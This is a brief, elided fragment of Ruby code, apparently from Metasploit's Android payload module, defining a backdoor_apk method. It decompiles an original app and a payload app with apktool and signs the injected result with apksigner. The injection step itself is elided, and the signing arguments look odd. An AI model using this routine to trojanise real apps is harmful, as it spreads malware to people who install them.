...
class Msf::Payload::Apk
  ...
  def backdoor_apk(apkfile, raw_payload)
    ...
    run_cmd("apktool d --force-manifest #{tempdir}/original.apk -o #{tempdir}/original")
    print_status "Decompiling payload APK..\n"
    run_cmd("apktool d --force-manifest #{tempdir}/payload.apk -o #{tempdir}/payload")
    ...
    print_status "Aligning... with apksigner #{injected_apk}\n"
    run_cmd("apksigner -p Cesar keystore #{injected_apk} #{aligned_apk}")
